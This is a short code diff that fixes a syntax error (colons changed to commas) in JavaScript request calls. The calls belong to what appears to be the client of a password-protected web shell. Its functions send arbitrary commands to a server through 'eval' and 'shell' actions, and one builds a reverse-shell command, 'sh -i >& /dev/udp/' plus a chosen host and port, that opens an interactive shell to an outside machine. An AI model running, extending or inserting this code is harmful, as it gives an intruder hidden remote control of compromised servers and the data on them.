@@ -35,7 +35,7 @@ $(document).ready(function() {
     function back_eval(cmd) {
         request({
             'passwd': window.api_password,
-            'action': 'eval':
+            'action': 'eval',
             'cmd': cmd
         })
     }
@@ -43,7 +43,7 @@ $(document).ready(function() {
     function back_shell(cmd) {
         request({
             'passwd': window.api_password,
-            'action': 'shell':
+            'action': 'shell',
             'cmd': cmd
         })
     }
@@ -56,7 +56,7 @@ $(document).ready(function() {
         }
         request({
             'passwd': window.api_password,
-            'action': 'shell':
+            'action': 'shell',
             'cmd': 'sh -i >& /dev/udp/' + args[0] + '/' + args[1] + ' 0>&1'
         })
     }
